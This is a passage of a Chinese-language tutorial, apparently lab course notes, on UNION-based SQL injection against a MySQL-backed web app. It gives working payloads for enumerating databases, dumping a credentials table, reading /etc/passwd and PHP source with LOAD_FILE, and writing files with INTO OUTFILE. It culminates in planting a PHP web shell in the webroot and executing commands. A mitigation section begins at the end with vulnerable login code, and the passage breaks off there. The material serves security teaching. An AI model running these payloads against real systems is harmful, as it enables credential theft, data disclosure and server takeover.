sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span> <span class=\"operator\">*</span> <span class=\"keyword\">FROM</span> my_database.users;</span><br></pre></td></tr></table></figure>\n\n<p>同样，我们可以查看<code>INFORMATION_SCHEMA</code>数据库中存在的表。</p>\n<hr>\n<h3 id=\"图式\"><a href=\"#图式\" class=\"headerlink\" title=\"图式\"></a>图式</h3><p>要开始我们的枚举，我们应该找到 DBMS 上可用的数据库。数据库中的表<a href=\"https://dev.mysql.com/doc/refman/8.0/en/information-schema-schemata-table.html\">SCHEMATA</a><code>INFORMATION_SCHEMA</code>包含有关服务器上所有数据库的信息。它用于获取数据库名称，以便我们可以查询它们。该<code>SCHEMA_NAME</code>列包含当前存在的所有数据库名称。</p>\n<p>让我们先在本地数据库上测试一下，看看查询是如何使用的：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;</span><br><span class=\"line\"></span><br><span class=\"line\">+--------------------+</span><br><span class=\"line\">| SCHEMA_NAME        |</span><br><span class=\"line\">+--------------------+</span><br><span class=\"line\">| mysql              |</span><br><span class=\"line\">| information_schema |</span><br><span class=\"line\">| performance_schema |</span><br><span class=\"line\">| ilfreight          |</span><br><span class=\"line\">| dev                |</span><br><span class=\"line\">+--------------------+</span><br><span class=\"line\">6 rows in set (0.01 sec)</span><br></pre></td></tr></table></figure>\n\n<p>我们看到了<code>ilfreight</code>和<code>dev</code>数据库。</p>\n<p>注意：前三个数据库是默认的 MySQL 数据库，并且存在于任何服务器上，因此我们通常在数据库枚举时忽略它们。有时还有第四个“系统”数据库。</p>\n<p>现在，让我们使用<code>UNION</code>SQL 注入来执行相同的操作，并使用以下有效负载：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cn<span class=\"string\">&#x27; UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p.ipic.vip/tsychv.png\" alt=\"img\"></p>\n<p>除了默认数据库之外，我们再次看到两个数据库，<code>ilfreight</code>和。<code>dev</code>让我们找出 Web 应用程序正在运行的数据库以从中检索端口数据。我们可以通过查询找到当前数据库<code>SELECT database()</code>。我们可以像在上一节中查找 DBMS 版本的方式一样执行此操作：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cn<span class=\"string\">&#x27; UNION select 1,database(),2,3-- -</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p.ipic.vip/4zwupa.jpg\" alt=\"img\"></p>\n<p>我们看到数据库名称是<code>ilfreight</code>. 然而，另一个数据库 ( <code>dev</code>) 看起来很有趣。因此，让我们尝试从中检索表格。</p>\n<hr>\n<h3 id=\"桌子\"><a href=\"#桌子\" class=\"headerlink\" title=\"桌子\"></a>桌子</h3><p>在我们从数据库中转储数据之前<code>dev</code>，我们需要获取表的列表以使用<code>SELECT</code>语句查询它们。要查找数据库中的所有表，我们可以使用数据库<code>TABLES</code>中的表<code>INFORMATION_SCHEMA</code>。</p>\n<p><a href=\"https://dev.mysql.com/doc/refman/8.0/en/information-schema-tables-table.html\">TABLES</a>表包含有关整个数据库中所有表的信息。该表包含多个列，但我们对<code>TABLE_SCHEMA</code>和<code>TABLE_NAME</code>列感兴趣。列<code>TABLE_NAME</code>存储表名，而<code>TABLE_SCHEMA</code>列指向每个表所属的数据库。这可以类似于我们找到数据库名称的方式来完成。例如，我们可以使用以下有效负载来查找<code>dev</code>数据库中的表：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cn<span class=\"string\">&#x27; UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema=&#x27;</span>dev<span class=\"string\">&#x27;-- -</span></span><br></pre></td></tr></table></figure>\n\n<p>请注意我们如何用“TABLE_NAME”和“TABLE_SCHEMA”替换数字“2”和“3”，以获取同一查询中两列的输出。</p>\n<p><img src=\"https://p.ipic.vip/h240uh.png\" alt=\"img\"></p>\n<p>注意：我们添加了一个 (where table_schema&#x3D;’dev’) 条件来只返回来自 ‘dev’ 数据库的表，否则我们会得到所有数据库中的所有表，这可能有很多。</p>\n<p>我们在 dev 数据库中看到四个表，即<code>credentials</code>、<code>framework</code>、<code>pages</code>和<code>posts</code>。例如，该<code>credentials</code>表可能包含要查看的敏感信息。</p>\n<hr>\n<h3 id=\"列\"><a href=\"#列\" class=\"headerlink\" title=\"列\"></a>列</h3><p>要转储表的数据<code>credentials</code>，首先要找到表中的列名，可以在数据库<code>COLUMNS</code>中的表中找到<code>INFORMATION_SCHEMA</code>。COLUMNS表包含有关所有数据库中存在的所有列的信息<a href=\"https://dev.mysql.com/doc/refman/8.0/en/information-schema-columns-table.html\">。</a>这有助于我们找到查询表的列名。、和列可用于实现此目的<code>COLUMN_NAME</code>。正如我们之前所做的那样，让我们尝试使用此有效负载来查找表中的列名：<code>TABLE_NAME``TABLE_SCHEMA``credentials</code></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cn<span class=\"string\">&#x27; UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name=&#x27;</span>credentials<span class=\"string\">&#x27;-- -  </span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p.ipic.vip/i7lof8.jpg\" alt=\"img\"></p>\n<p>该表有两列，名为<code>username</code>和<code>password</code>。我们可以使用此信息并从表中转储数据。</p>\n<hr>\n<h3 id=\"数据\"><a href=\"#数据\" class=\"headerlink\" title=\"数据\"></a>数据</h3><p>现在我们有了所有的信息，我们可以形成我们的查询来从数据库中的表中<code>UNION</code>转储<code>username</code>和<code>password</code>列的数据。我们可以用and代替第 2 列和第 3 列：<code>credentials``dev``username``password</code></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cn<span class=\"string\">&#x27; UNION select 1, username, password, 4 from dev.credentials-- -</span></span><br></pre></td></tr></table></figure>\n\n<p>请记住：不要忘记使用点运算符来引用“开发”数据库中的“凭据”，因为我们在“ilfreight”数据库中运行，如前所述。</p>\n<p><img src=\"https://p.ipic.vip/n9oypj.png\" alt=\"img\"></p>\n<p>我们能够获取<code>credentials</code>表中的所有条目，其中包含密码哈希和 API 密钥等敏感信息。</p>\n<h2 id=\"0x10-读取文件\"><a href=\"#0x10-读取文件\" class=\"headerlink\" title=\"0x10 读取文件\"></a>0x10 读取文件</h2><p>除了从 DBMS 中的各种表和数据库中收集数据外，SQL 注入还可以用于执行许多其他操作，例如在服务器上读取和写入文件，甚至在后端服务器上获得远程代码执行。</p>\n<hr>\n<h3 id=\"特权\"><a href=\"#特权\" class=\"headerlink\" title=\"特权\"></a>特权</h3><p>读取数据比写入数据更为常见，在现代 DBMS 中，写入数据严格保留给特权用户使用，因为它会导致系统利用，正如我们将看到的那样。例如，在 中<code>MySQL</code>，DB 用户必须有权<code>FILE</code>将文件的内容加载到表中，然后从该表中转储数据并读取文件。因此，让我们从收集有关我们在数据库中的用户权限的数据开始，以决定我们是否将文件读取和&#x2F;或写入后端服务器。</p>\n<h5 id=\"数据库用户\"><a href=\"#数据库用户\" class=\"headerlink\" title=\"数据库用户\"></a>数据库用户</h5><p>首先，我们必须确定我们在数据库中是哪个用户。虽然我们不一定需要数据库管理员 (DBA) 权限来读取数据，但在现代 DBMS 中这变得越来越需要，因为只有 DBA 才被授予此类权限。这同样适用于其他常见的数据库。如果我们确实拥有 DBA 权限，那么我们更有可能拥有文件读取权限。如果我们不这样做，那么我们必须检查我们的特权，看看我们能做什么。为了能够找到我们当前的数据库用户，我们可以使用以下任何查询：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span> <span class=\"keyword\">USER</span>()</span><br><span class=\"line\"><span class=\"keyword\">SELECT</span> <span class=\"built_in\">CURRENT_USER</span>()</span><br><span class=\"line\"><span class=\"keyword\">SELECT</span> <span class=\"keyword\">user</span> <span class=\"keyword\">from</span> mysql.user</span><br></pre></td></tr></table></figure>\n\n<p>我们的<code>UNION</code>注入有效载荷如下：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cn<span class=\"string\">&#x27; UNION SELECT 1, user(), 3, 4-- -</span></span><br></pre></td></tr></table></figure>\n\n<p>或者：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cn<span class=\"string\">&#x27; UNION SELECT 1, user, 3, 4 from mysql.user-- -</span></span><br></pre></td></tr></table></figure>\n\n<p>这告诉我们我们当前的用户，在这种情况下是<code>root</code>：</p>\n<p><img src=\"https://p.ipic.vip/mt3xp0.jpg\" alt=\"img\"></p>\n<p>这是非常有前途的，因为根用户很可能是 DBA，这给了我们很多特权。</p>\n<h5 id=\"用户权限\"><a href=\"#用户权限\" class=\"headerlink\" title=\"用户权限\"></a>用户权限</h5><p>现在我们知道了我们的用户，我们可以开始寻找我们对那个用户有什么特权。首先，我们可以通过以下查询来测试我们是否拥有超级管理员权限：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span> super_priv <span class=\"keyword\">FROM</span> mysql.user</span><br></pre></td></tr></table></figure>\n\n<p>再一次，我们可以在上述查询中使用以下有效负载：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cn<span class=\"string\">&#x27; UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -</span></span><br></pre></td></tr></table></figure>\n\n<p>如果我们在 DBMS 中有很多用户，我们可以添加<code>WHERE user=&quot;root&quot;</code>只显示当前用户的权限<code>root</code>：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cn<span class=\"string\">&#x27; UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user=&quot;root&quot;-- -  </span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p.ipic.vip/d6y0ff.jpg\" alt=\"img\"></p>\n<p>查询返回<code>Y</code>，这意味着<code>YES</code>，表示超级用户权限。我们还可以使用以下查询直接从模式中转储我们拥有的其他特权：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cn<span class=\"string\">&#x27; UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -</span></span><br></pre></td></tr></table></figure>\n\n<p>再一次，我们可以添加<code>WHERE user=&quot;root&quot;</code>以仅显示我们当前的用户<code>root</code>权限。我们的有效载荷将是：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cn<span class=\"string\">&#x27; UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE user=&quot;root&quot;-- -</span></span><br></pre></td></tr></table></figure>\n\n<p>我们看到了所有可能赋予我们当前用户的权限：</p>\n<p><img src=\"https://p.ipic.vip/yv5vct.jpg\" alt=\"img\"></p>\n<p>我们看到<code>FILE</code>为我们的用户列出了权限，使我们能够读取文件甚至可能写入文件。因此，我们可以继续尝试读取文件。</p>\n<hr>\n<h3 id=\"加载文件\"><a href=\"#加载文件\" class=\"headerlink\" title=\"加载文件\"></a>加载文件</h3><p>现在我们知道我们有足够的权限来读取本地系统文件，让我们使用函数来做到这一点<code>LOAD_FILE()</code>。LOAD_FILE <a href=\"https://mariadb.com/kb/en/load_file/\">()</a>函数可用于 MariaDB &#x2F; MySQL 从文件中读取数据。该函数只接受一个参数，即文件名。以下查询是如何读取文件的示例<code>/etc/passwd</code>：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span> LOAD_FILE(<span class=\"string\">&#x27;/etc/passwd&#x27;</span>);</span><br></pre></td></tr></table></figure>\n\n<p>注意：如果运行 MySQL 的 OS 用户有足够的权限读取文件，我们将只能读取该文件。</p>\n<p>类似于我们一直使用<code>UNION</code>注入的方式，我们可以使用上面的查询：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cn<span class=\"string\">&#x27; UNION SELECT 1, LOAD_FILE(&quot;/etc/passwd&quot;), 3, 4-- -</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p.ipic.vip/pukwyf.png\" alt=\"img\"></p>\n<p>我们能够通过SQL注入成功读取到passwd文件的内容。不幸的是，这也可能被用来泄露应用程序源代码。</p>\n<hr>\n<h3 id=\"另一个例子-1\"><a href=\"#另一个例子-1\" class=\"headerlink\" title=\"另一个例子\"></a>另一个例子</h3><p>我们知道当前页面是<code>search.php</code>。默认的 Apache webroot 是<code>/var/www/html</code>. 让我们尝试阅读文件的源代码<code>/var/www/html/search.php</code>。</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cn<span class=\"string\">&#x27; UNION SELECT 1, LOAD_FILE(&quot;/var/www/html/search.php&quot;), 3, 4-- -</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p.ipic.vip/1alxqy.png\" alt=\"img\"></p>\n<p>但是，该页面最终会在浏览器中呈现 HTML 代码。可以通过点击查看 HTML 源代码<code>[Ctrl + U]</code>。</p>\n<p><img src=\"https://p.ipic.vip/e0u51d.png\" alt=\"加载文件源\"></p>\n<p>源代码向我们展示了完整的 PHP 代码，可以对其进行进一步检查以查找敏感信息（如数据库连接凭据）或查找更多漏洞。</p>\n<h2 id=\"0x11-写入文件\"><a href=\"#0x11-写入文件\" class=\"headerlink\" title=\"0x11 写入文件\"></a>0x11 写入文件</h2><p>当涉及到将文件写入后端服务器时，它在现代 DBMS 中变得更加受限，因为我们可以利用它在远程服务器上编写一个 web shell，从而执行代码并接管服务器。这就是现代 DBMS 默认禁用文件写入并要求 DBA 具有某些权限才能写入文件的原因。在写文件之前，我们首先要检查自己是否有足够的权限，DBMS是否允许写文件。</p>\n<hr>\n<h3 id=\"写文件权限\"><a href=\"#写文件权限\" class=\"headerlink\" title=\"写文件权限\"></a>写文件权限</h3><p>为了能够使用 MySQL 数据库将文件写入后端服务器，我们需要三件事：</p>\n<ol>\n<li><code>FILE</code>启用权限的用户</li>\n<li><code>secure_file_priv</code>未启用MySQL 全局变量</li>\n<li>对后端服务器上我们要写入的位置的写入权限</li>\n</ol>\n<p>我们已经发现我们的当前用户具有<code>FILE</code>写入文件所需的权限。我们现在必须检查 MySQL 数据库是否具有该权限。这可以通过检查全局变量来完成<code>secure_file_priv</code>。</p>\n<h5 id=\"secure-file-priv\"><a href=\"#secure-file-priv\" class=\"headerlink\" title=\"secure_file_priv\"></a>secure_file_priv</h5><p><a href=\"https://mariadb.com/kb/en/server-system-variables/#secure_file_priv\">secure_file_priv</a>变量用于确定从何处读取&#x2F;写入文件。一个空值可以让我们从整个文件系统中读取文件。否则，如果设置了某个目录，我们只能从变量指定的文件夹中读取。另一方面，<code>NULL</code>意味着我们不能从任何目录读&#x2F;写。MariaDB 将此变量默认设置为空，如果用户有权限，这允许我们读&#x2F;写任何文件<code>FILE</code>。但是，<code>MySQL</code>用作<code>/var/lib/mysql-files</code>默认文件夹。这意味着<code>MySQL</code>使用默认设置无法通过注入读取文件。更糟糕的是，一些现代配置默认为<code>NULL</code>，这意味着我们无法在系统内的任何地方读取&#x2F;写入文件。</p>\n<p>那么，让我们看看如何找出 的值<code>secure_file_priv</code>。在 中<code>MySQL</code>，我们可以使用以下查询来获取此变量的值：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SHOW</span> VARIABLES <span class=\"keyword\">LIKE</span> <span class=\"string\">&#x27;secure_file_priv&#x27;</span>;</span><br></pre></td></tr></table></figure>\n\n<p>但是，由于我们正在使用<code>UNION</code>注入，因此我们必须使用语句来获取值<code>SELECT</code>。这应该不是问题，因为所有变量和大多数配置都存储在<code>INFORMATION_SCHEMA</code>数据库中。<code>MySQL</code>全局变量存储在一个名为<a href=\"https://dev.mysql.com/doc/refman/5.7/en/information-schema-variables-table.html\">global_variables 的</a>表中，根据文档，该表有两列<code>variable_name</code>和<code>variable_value</code>。</p>\n<p>我们必须从<code>INFORMATION_SCHEMA</code>数据库中的那个表中选择这两列。MySQL 配置中有数百个全局变量，我们不想检索所有这些变量。<code>secure_file_priv</code>然后，我们将使用<code>WHERE</code>我们在上一节中学到的子句过滤结果以仅显示变量。</p>\n<p>最终的 SQL 查询如下：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span> variable_name, variable_value <span class=\"keyword\">FROM</span> information_schema.global_variables <span class=\"keyword\">where</span> variable_name<span class=\"operator\">=</span>&quot;secure_file_priv&quot;</span><br></pre></td></tr></table></figure>\n\n<p>因此，与其他注入查询类似<code>UNION</code>，我们可以使用以下 payload 获得上述查询结果。请记住再添加两列<code>1</code>&amp;<code>4</code>作为垃圾数据，总共有 4 列’：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cn<span class=\"string\">&#x27; UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name=&quot;secure_file_priv&quot;-- -</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p.ipic.vip/h557d4.jpg\" alt=\"img\"></p>\n<p>结果显示该<code>secure_file_priv</code>值为空，这意味着我们可以将文件读&#x2F;写到任何位置。</p>\n<hr>\n<h3 id=\"选择进入-OUTFILE\"><a href=\"#选择进入-OUTFILE\" class=\"headerlink\" title=\"选择进入 OUTFILE\"></a>选择进入 OUTFILE</h3><p>现在我们已经确认我们的用户应该将文件写入后端服务器，让我们尝试使用语句来做到这一点<code>SELECT .. INTO OUTFILE</code>。SELECT <a href=\"https://mariadb.com/kb/en/select-into-outfile/\">INTO OUTFILE</a>语句可用于将来自选择查询的数据写入文件。这通常用于从表中导出数据。</p>\n<p>要使用它，我们可以<code>INTO OUTFILE &#39;...&#39;</code>在查询之后添加以将结果导出到我们指定的文件中。下面的示例将表的输出保存<code>users</code>到文件中<code>/tmp/credentials</code>：</p>\n<p> secure_file_priv</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SELECT * from users INTO OUTFILE &#x27;/tmp/credentials&#x27;;</span><br></pre></td></tr></table></figure>\n\n<p>如果我们转到后端服务器和<code>cat</code>文件，我们会看到该表的内容：</p>\n<p> secure_file_priv</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sl1aun@htb[/htb]$ cat /tmp/credentials </span><br><span class=\"line\"></span><br><span class=\"line\">1       admin   392037dbba51f692776d6cefb6dd546d</span><br><span class=\"line\">2       newuser 9da2c9bcdf39d8610954e0e11ea8f45f</span><br></pre></td></tr></table></figure>\n\n<p>也可以直接将<code>SELECT</code>字符串写入文件，让我们可以向后端服务器写入任意文件。</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span> <span class=\"string\">&#x27;this is a test&#x27;</span> <span class=\"keyword\">INTO</span> OUTFILE <span class=\"string\">&#x27;/tmp/test.txt&#x27;</span>;</span><br></pre></td></tr></table></figure>\n\n<p>当我们<code>cat</code>打开文件时，我们会看到该文本：</p>\n<p> secure_file_priv</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sl1aun@htb[/htb]$ cat /tmp/test.txt </span><br><span class=\"line\"></span><br><span class=\"line\">this is a test</span><br></pre></td></tr></table></figure>\n\n<p> secure_file_priv</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sl1aun@htb[/htb]$ ls -la /tmp/test.txt </span><br><span class=\"line\"></span><br><span class=\"line\">-rw-rw-rw- 1 mysql mysql 15 Jul  8 06:20 /tmp/test.txt</span><br></pre></td></tr></table></figure>\n\n<p>正如我们在上面看到的，该<code>test.txt</code>文件已成功创建并归<code>mysql</code>用户所有。</p>\n<p>提示：高级文件导出利用“FROM_BASE64(“base64_data”)”函数，以便能够写入长文件&#x2F;高级文件，包括二进制数据。</p>\n<hr>\n<h3 id=\"通过-SQL-注入写入文件\"><a href=\"#通过-SQL-注入写入文件\" class=\"headerlink\" title=\"通过 SQL 注入写入文件\"></a>通过 SQL 注入写入文件</h3><p>让我们尝试向 webroot 写入一个文本文件并验证我们是否具有写入权限。下面的查询应该写入<code>file written successfully!</code>文件<code>/var/www/html/proof.txt</code>，然后我们可以在 Web 应用程序上访问该文件：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"string\">&#x27;file written successfully!&#x27;</span> <span class=\"keyword\">into</span> outfile <span class=\"string\">&#x27;/var/www/html/proof.txt&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p><strong>注意：</strong>要编写 web shell，我们必须知道 web 服务器的基本 web 目录（即 web root）。找到它的一种方法是使用<code>load_file</code>读取服务器配置，例如在 找到 Apache 的配置<code>/etc/apache2/apache2.conf</code>，在 找到 Nginx 的配置<code>/etc/nginx/nginx.conf</code>，或者在 找到 IIS 配置<code>%WinDir%\\System32\\Inetsrv\\Config\\ApplicationHost.config</code>，或者我们可以在线搜索其他可能的配置位置。此外，我们可能会运行模糊扫描并尝试将文件写入不同的可能的 Web 根目录，使用<a href=\"https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt\">这个 Linux 的词表</a>或<a href=\"https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt\">这个 Windows 的词表</a>。最后，如果以上方法都不起作用，我们可以使用显示给我们的服务器错误并尝试以这种方式找到 web 目录。</p>\n<p>注入<code>UNION</code>有效载荷如下：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cn<span class=\"string\">&#x27; union select 1,&#x27;</span>file written successfully<span class=\"operator\">!</span><span class=\"string\">&#x27;,3,4 into outfile &#x27;</span><span class=\"operator\">/</span>var<span class=\"operator\">/</span>www<span class=\"operator\">/</span>html<span class=\"operator\">/</span>proof.txt<span class=\"string\">&#x27;-- -</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p.ipic.vip/hkrsmg.png\" alt=\"img\"></p>\n<p>我们在页面上没有看到任何错误，这表明查询成功了。<code>proof.txt</code>检查webroot 中的文件，我们看到它确实存在：</p>\n<p><img src=\"https://p.ipic.vip/40z8r3.png\" alt=\"img\"></p>\n<p>注意：我们看到我们转储的字符串以及前面的“1”、“3”和后面的“4”。这是因为整个“UNION”查询结果都写入了文件。为了使输出更清晰，我们可以使用 “” 而不是数字。</p>\n<hr>\n<h3 id=\"编写网络外壳\"><a href=\"#编写网络外壳\" class=\"headerlink\" title=\"编写网络外壳\"></a>编写网络外壳</h3><p>确认写入权限后，我们可以继续将 PHP web shell 写入 webroot 文件夹。我们可以编写如下的PHP webshell来直接在后台服务器上执行命令：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> <span class=\"title function_ invoke__\">system</span>(<span class=\"variable\">$_REQUEST</span>[<span class=\"number\">0</span>]); <span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>我们可以重用我们之前的<code>UNION</code>注入载荷，并将字符串更改为上面的字符串，并将文件名更改为<code>shell.php</code>：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cn<span class=\"string\">&#x27; union select &quot;&quot;,&#x27;</span><span class=\"operator\">&lt;</span>?php <span class=\"keyword\">system</span>($_REQUEST[<span class=\"number\">0</span>]); ?<span class=\"operator\">&gt;</span><span class=\"string\">&#x27;, &quot;&quot;, &quot;&quot; into outfile &#x27;</span><span class=\"operator\">/</span>var<span class=\"operator\">/</span>www<span class=\"operator\">/</span>html<span class=\"operator\">/</span>shell.php<span class=\"string\">&#x27;-- -</span></span><br></pre></td></tr></table></figure>\n\n<p>  ‘, “ “, “ “ 进入输出文件 ‘&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php’– -‘&gt;</p>\n<p><img src=\"https://p.ipic.vip/ur051n.png\" alt=\"img\"></p>\n<p>再一次，我们没有看到任何错误，这意味着文件写入可能有效。<code>/shell.php</code>这可以通过浏览到文件并通过参数执行命令来验证<code>0</code>，<code>?0=id</code>在我们的 URL 中：</p>\n<p><img src=\"https://p.ipic.vip/2kzupt.png\" alt=\"img\"></p>\n<p>该<code>id</code>命令的输出确认我们执行了代码并以用户身份运行<code>www-data</code>。</p>\n<h2 id=\"0x12-缓解-SQL-注入\"><a href=\"#0x12-缓解-SQL-注入\" class=\"headerlink\" title=\"0x12 缓解 SQL 注入\"></a>0x12 缓解 SQL 注入</h2><hr>\n<p>我们已经了解了 SQL 注入、它们发生的原因以及我们如何利用它们。我们还应该学习如何在我们的代码中避免这些类型的漏洞，并在发现它们时对其进行修补。让我们看一些如何缓解 SQL 注入的示例。</p>\n<hr>\n<h3 id=\"输入消毒\"><a href=\"#输入消毒\" class=\"headerlink\" title=\"输入消毒\"></a>输入消毒</h3><p>这是我们之前讨论的身份验证绕过部分的代码片段：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;SNIP&gt;</span><br><span class=\"line\">  <span class=\"variable\">$username</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;username&#x27;</span>];</span><br><span class=\"line\">  <span class=\"variable\">$password</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;password&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"variable\">$query</span> = <span class=\"string\">&quot;SELECT * FROM logins WHERE username=&#x27;&quot;</span>. <span class=\"variable\">$username</span>. <span class=\"string\">&quot;&#x27; AND password = &#x27;&quot;</span> . <span class=\"variable\">$password</span> . <span class=\"string\">&quot;&#x27;;&quot;</span> ;</span><br><span class=\"line\">  <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Executing query: &quot;</span> . <span class=\"variable\">$query</span> . <span class=\"string\">&quot;&lt;br /&gt;&lt;br /&gt;&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!<span class=\"title function_ invoke__\">mysqli_query</span>(<span class=\"variable\">$conn</span> ,<span class=\"variable\">$query</span>))</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">          <span class=\"keyword\">die</span>(<span 